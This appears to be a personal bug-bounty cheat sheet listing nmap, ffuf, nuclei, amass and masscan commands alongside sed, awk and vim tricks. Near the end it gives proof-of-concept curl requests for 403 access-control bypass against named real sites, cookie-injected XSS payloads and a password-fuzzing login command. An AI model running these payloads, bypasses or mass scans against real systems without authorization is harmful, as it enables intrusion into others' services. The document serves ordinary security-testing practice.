---------------
nmap : 
	$ nmap -sC -sV -oN nmap/initial 10.10.214.167

	$ nmap -p- -A -sC -sV -oN nmap/initial 10.10.214.167
		-p-	# to scan ports from 1 through 65535
		-A 	# Enable OS detection, version detection, script scanning, and traceroute

	$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.152.236
	$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.152.236
	$ nmap -sV --script=vulscan,vulners,"(*cve*)" -Pn -iL $URLS >> NMAP_REPORTS


	1   -Pn
	4   -p
	5   -sV
	17  -O
	20  -oA 

	----------Converting XML to HTML
		$	xsltproc xml -o xmlhtml
---------------
ffuf : 
	$ ffuf -u ["@.com/&"url] -w [wordlistpath]:@ -w [wordlistpath]:& -of html -o [filename]
		# save to html output

	$ ffuf -request [vim file] -w [wordlistpath]
		# Right click copy of file https://ibb.co/B6csdcC
		# Save input to vim https://ibb.co/JxKRMXB

	$ ffuf -w [wordlistpath] -u [url.com/api/FUZZ/6] -o output.txt -replay-proxy http://127.0.0.1:8080 -b "[putyourcookiehereneedloginfor]" 
		-b # flag is for cookies or session
		# difference between auth website https://ibb.co/hcwqhbW

	$ ffuf -w [wordlistpath] -u [url.com/api/user/6] -o output.txt -replay-proxy http://127.0.0.1:8080 -H "user-agent:FUZZ"
		-H #-H flag is for header fuzzing 
		# input bug bounty x forwarded error https://ibb.co/sRZzC9W
		# output https://ibb.co/Xpk1j7p

	$ ffuf -w [wordlistpath] -u [url.com/api/FUZZ/6] -o output.txt -replay-proxy http://127.0.0.1:8080 -p 1 -t 3 "[putyourcookiehereneedloginfor]" 
		-p -t # IMG explained  https://ibb.co/Drx8h72

	$ ffuf -w [wordlistpath] -u [url.com/api/FUZZ/6] -o output.txt -replay-proxy http://127.0.0.1:8080 -rate 100
		-rate 100 # 100/perseconds rate is for depending how many rate you will in seconds 

	$ ffuf -w [wordlistpath] -u [url.com/api/FUZZ/6] -o output.txt -replay-proxy http://127.0.0.1:8080 -fw 1 -mc 302 -fr "not found"
		-fw 1 # remove only one words in header response 
		-mc 302 # we only interested in 302 response from header/HTTP 	
		-fr "not found" # filter out 

	$ ffuf -w [wordlistpath] -u [url.com/login] -X POST -d "email=usernmae&password=FUZZ" -replay-proxy http://127.0.0.1:8080
		-X type of HTTP method  # https://ibb.co/J2pWPqz
		-d # post data like login
			# IMG https://ibb.co/chqYxnJ
			# IMG https://ibb.co/9yn2h9x

---------------
nikto :




---------------
nuclei :


	nuclei -l $URLS -t ~/nuclei-templates/cves/ -silent -c 50 -o nuclei/cves
    nuclei -l $URLS -t ~/nuclei-templates/vulnerabilities/ -silent -c 50 -o nuclei/vulnerabilities
    nuclei -l $URLS -t ~/nuclei-templates/misconfiguration/ -silent -c 50 -o nuclei/misconfiguration
    nuclei -l $URLS -t ~/nuclei-templates/exposed-tokens/ -silent -c 50 -o nuclei/exposed-tokens
    nuclei -l $URLS -t ~/nuclei-templates/exposed-panels/ -silent -c 50 -o nuclei/exposed-panels
    nuclei -l $URLS -t ~/nuclei-templates/fuzzing/ -silent -c 50 -o nuclei/fuzzing
    nuclei -l $URLS -t ~/nuclei-templates/default-logins/ -silent -c 50 -o nuclei/default-logins
    nuclei -l $URLS -t ~/nuclei-templates/technologies/ -silent -c 50 -o nuclei/technologies
    nuclei -l $URLS -t ~/nuclei-templates/takeovers/ -silent -c 50 -o nuclei/takeovers

---------------
shoda : 
	
	$ shodan domain [example.com] | awk '{print $3}' | httpx | nuclei -o [bugbounty.txt] -v -t 

---------------
smbclient :
	$ smbclient //10.10.26.126/Anonymous
---------------
xargs : 
	$ ls | xargs -I@ sh -c '{ cd @/2021-04-06; AUTOSCAN @; }'

---------------
find :
	$ find . -path ./mnt -prune -false -o -name '*.txt'
		-path	# Exclude /mnt file 
		-name	# All this file will look [*.txt]

	$ find . -type d \( -path ./home -o -path ./usr -o -path ./proc -o -path ./mnt \) -prune -false -o -name '*'
		-type d # Exclude all inside 

	$ find . -type f -exec ls -Shl {} + // With date

	$ ls | grep -v mnt | grep -v home | grep -v bin | xargs find
	$ find . -maxdepth 2 -type f -exec cp "{}" ~/testing \;
	$ find . -maxdepth 2 -type f -print -exec cat {} \; | less
---------------
python : 
	$ python3.9 -m pip install capstone unicorn keystone-engine ropper
		Installing package on specific python version on Linux *

	$ pip3 install -r requirements.txt
---------------
grep : 
	$ grep -Hnri SOMETHING *
		H #display the filename 
		n #display the line number 
		r #recursive
		i #ignore case

---------------
rm :
	ls | grep -v "final" | xargs rm
		# deleting file exclude one / delete not equal to "final"

---------------
sed : 
	$ cat urls | sed 's~http[s]*://~~g'

	$ sed 's/\.com.*/.com/' file.txt
	$ sed 's/.com.*/.com/' file.txt
		# It will delete anything after `com` --> 

	$ sed -i 's/\(m\/PH\).*/\1/' paragraph
	$ sed 's/^.*removingbefore//' 
		^.* remove anything before something else
		#input : iwanttoremovingbefore allthatshit
		#output : allthatshit
	$ sed 's/^.*\///'
		#input : 54.95.128.0/17
		#output : 17
	$ sed '$d' 
		# Removing last row  

	$ sed 's/,/\n/g' 
		# Matching qoute create newline \n . g syntax will replace all entites

	$ sed -e 's/[\t ]//g;/^$/d' 
		# Removing all whitepaces 
---------------
vim :
	:%s@m/PH.*@m/PH@
	:%s/\(m\/PH\).*$/\1
		# It will delete anything after `m/PH` -->
		# compare
	:%s/foo/bar/g
		# replace [foo] to [bar]

	:noh 
		# removed highlight
	:%!grep -v SOMETHING
	:%!awk -F':' '{print $3}'
	:%!xargs -n1 -I@ sh -c 'echo {} | base64 -d'
		-n1 # Whole line number 
	:%s/$/\",/g 
		-$ last line , add ", to every lastline of the file 

	: awk -v RS=" " '{print}' [filename]
		-replace all spaces with new line/newline
---------------

sort : 

	sort -t / -k 2,2n
	#input : 
	#output : 


vimdiff :
	$ vimdiff -d file1.txt file.2txt

---------------
gf : 
	gf base64 # Will look for any base64 all file in this folder 

---------------
awk :

	$ cat file.txt | awk -F '\\.com' '{print $1".com"}'
	$ cat testing | awk -F '.com' '{print $1".com"}'
		# It will delete anything after `com` -->

	$ cat PortUNK | awk '{if(NR > 2) print}' 
		# Removing 1,2 Row
---------------
amass : 
	amass enum  -src -ip -brute -min-for-recursive 2 -d binance.com -o binance.com.subs



---------------
screen : 
	
	screen -dmS findomain bash
	screen -dmS amass bash
	screen -dmS subfinder bash

	screen -dmS assetfinder bash
	screen -S assetfinder -p 0 -X stuff "while true ; do if [ $(screen -list | grep -ic Crawl) -eq 0 ]; then :; break ; fi ; echo $value ; sleep 0.1 ; done \n"
	screen -r assetfinder
	screen -S findomain -p 0 -X stuff "findomain -f $filename -u $path/findomain_result &>/dev/null \n"
	screen -S amass -p 0 -X stuff "amass intel -asn $amass_type 1> $path/amass_result \n"
	screen -S amass -p 0 -X stuff "amass enum -df $filename 1> $path/amass_result \n


	screen -dmS Crwling zsh && screen -S Crwling -p 0 -X stuff 'while read line ; do echo "BULLSHIT " \$line ; done < '"$f_PATH/$FILE_CRAWL" && screen -r Crwling
	\$ Quote read variable . Escaping Qoute will read inside script variable

	screen -dmS Crwling zsh && screen -S Crwling -p 0 -X stuff 'var=1 ; while [ \$var != 0 ] ; do var=\$(screen -list | grep -ic Crawl) ; echo "Crawling Still Running : " \$var ; sleep 0.1 ; done \n'"cat * | sort -u \n" && screen -r Crwling
---------------
cut : 
	$ cut -d']' -f 2
		input :
			[Crtsh]           api.hackerone.com 2606:4700::6810:6434,2606:4700::6810:6334,104.16.99.52,104.16.100.52
			[DNS]             a.ns.hackerone.com 162.159.0.31,2400:cb00:2049:1::a29f:1f
	
		output :
			           api.hackerone.com 2606:4700::6810:6434,2606:4700::6810:6334,104.16.99.52,104.16.100.52
	             a.ns.hackerone.com 162.159.0.31,2400:cb00:2049:1::a29f:1f

---------------
Loop commandline:

	bash script  
		for :
			var=$(cat final_crawl.txt) ; for var in $var ; do echo $var | kxss ; done
		
		while : 
			while read line; do echo "Ping : " | ping $line -c 2 ; done < final_recon.txt


---------------
wc : 
	wc < file | awk '{ print $1, $2 }'

---------------
pr :
	$ pr -m -t one.txt two.txt
		# print two files // cat two files

---------------
gron :
	// JSON
	cat file.json | gron
		# print to javascript format easily readable
	cat file.json | gron | grep file
	cat file.json | gron | grep file | gron -u
		# reverse it to json but it is , filter

-------------------------
tomnomnom :
	-mythology
		$ cat domains | httprobe | tee hosts
		$ meg -d 1000 -v /
		$ cd out
		$ vim index
		$ grep -Hnri admin/internal * | vim -
			:w results
		$gf base64
			:%!awk -F':' '{print $3}'
			:%!sort -u
			:%!xargs -n1 -I@ sh -c 'echo @ | base64 -f'
		$ find . -type f | html-tool attribs src | grep '\.js$'
		$ find . -type f | html-tool tags title | vim -
			:%!sort -u
			:\g
			keybind# ctrl w + g + shift f
		$ gf urls | grep -i NAMEOFURTARGET | vim -
			:%!sort -u
			:%!unfurl -u paths
			:%!unfurl -u keys


-------------------------
.git dorking : 
	ghdump.sh | grep
























-------------------------
	
	Hackerone : 
		POC : 
			curl -k https://biz-app.yelp.com/status -H "X-Forwarded-For: 127.0.0.1"
			curl -k https://biz-app.yelp.com/swagger.json -H "X-Forwarded-For: 127.0.0.1"

		STEP : # NORMAL / PAYLOAD
			`````
				This request shows normal behavior
				curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' $'https://account.mackeeper.com/admin/login'
				and returns 403
				Here you can see how we can bypass these restrictions
				curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' -H $'X-rewrite-url: admin/login' $'https://account.mackeeper.com/'
			`````



	Medium :  
		POC : 
			curl -X ‘X-Forwarded-For: 127.0.0.1’ http://i-protected-by-host-based-auth.com/
			curl -H "Content-Length:0" -X POST https://www.███████.mil/██████████
			curl -X POST -H “Content-Length:0” https://www.xyz.com
			curl -i -s -k -X $’GET’ -H $’Host: sub.xyz.com’ -H $’X-rewrite-url: .htaccess’ $’https://sub.xyz.com/'

		`````
			curl -i -s -k -X $’GET’ -H $’Host: sub.xyz.com’ -H $’X-rewrite-url: .htaccess’ $’https://sub.xyz.com/'

			xyz.com/secret/*
			xyz.com/secret/./
			xyz.com/secret/
			xyz.com/%2f/secret.txt/
		`````

		STEP : # NORMAL / PAYLOAD
			# cookie injection / reflected 
			`````
				Normal : 	Cookie: RT=6bjzl0zEmBiPl0IQRSeN5wxxx; GA_countryCode=GBxxxxxx;
				Test : 		Cookie: RT=6bjzl0zEmBiPl0IQRSeN5wxxx; GA_countryCode=GB“><svg/on</script>load=alert`1`>
				POC : 		Cookie: RT=6bjzl0zEmBiPl0IQRSeN5wxxx; GA_countryCode=GB“-prompt`1`-”//;
			`````

	UNK : 
		curl --data-binary foobar http://dp3-l3:22290 -H "X-Forwarded-For: barfoo";

	```
	[space]Transfer-Encoding: chunked
	0
	```
	
	
	
	
	
		
	
	
	
	
		
	
	
	
	
-------------------------

PYTHON : 
	Linux : 
		sudo -H pip3 install --upgrade pip
		sudo -H pip3 install virtualenv
			virtualenv --python=/usr/bin/python2.6 <path/to/new/virtualenv/>
	
		source my_project_env/bin/activate

		pip install jupyter
		jupyter notebook
		
	Windows :
		C:\Program Files\Python__version\Scripts\pip.exe virtualenv
		C:\Program Files\Python__version\python.exe -m venv 'C:\Users\Sankyo\VirtualEnv\NameOfFolder'
		C:\Users\Sankyo\VirtualEnv\EnvPy37\Scripts\Activate.[ps or bat]
			cmd : C:\> <venv>\Scripts\activate.bat
			powershell : PS C:\> <venv>\Scripts\Activate.ps1
  
	


-------------------------

NETWORK PENETRATION TESTING : 
	$ amass enum  -src -ip -brute -min-for-recursive 2 -d binance.com -o subdomain 
	$ cut subdomain -d ' ' -f 7 | sed 's~,~\n~g' | sort -u | httpx | sed 's/http[s]*:\/\///g' | tee resolver 

	$ sudo masscan -iL resolver -p10000,10001,102,1080,11,110,111,115,1159,1160,1161,119,123,137,138,139,143,1433,1434,1435,1443,15,1512,1518,16,161,1701,1720,1723,1728,180,18004,1812,18245,18246,1911,1935,1962,2,20,2000,20000,2001,2002,2003,2004,2005,2006,2007,2049,20547,21,22,2222,2223,223,23,2323,2332,2404,2455,25,25001,3,30001,3001,30303,3128,3260,3306,3389,34567,37,37777,389,4,43,443,445,44818,4550,4672,48,49,4911,49152,50,500,5000,5001,5004,5005,5006,5007,502,50505,5060,5061,5094,51,513,515,5150,5160,520,52869,53,54,5400,5431,5432,546,547,548,5511,554,5550,55536,56000,5900,5938,60000,636,65000,6550,67,68,6881,69,7,7000,7001,7547,789,79,80,8000,8008,8009,8080,8081,8090,81,8100,8150,8443,873,88,8866,888,8883,8888,892,9,9000,9040,9100,9600,9650,993,995,9997,9998,9999 --rate 1000000 -n -Pn -oG openports.txt
		# Look for open ports and segregate

	$ sudo nmap -sV -Pn -O -script=vulners/vulners.nse,vulscan/vulscan.nse -iL resolver -p80,443 -oA vuln/vuln
